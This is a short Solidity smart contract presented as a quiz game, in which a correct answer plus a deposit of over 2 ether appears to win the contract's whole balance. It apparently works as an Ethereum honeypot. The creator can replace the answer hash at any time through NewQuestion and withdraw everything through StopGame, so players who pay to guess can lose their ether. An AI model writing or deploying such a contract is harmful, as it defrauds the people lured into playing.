pragma solidity ^0.4.20;

contract Try_Me
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function start_round(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            
            question = _question;
            
            questionSender = msg.sender;
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        
        question = _question;
        
        responseHash = _responseHash;
    }
    
    function() public payable{}
}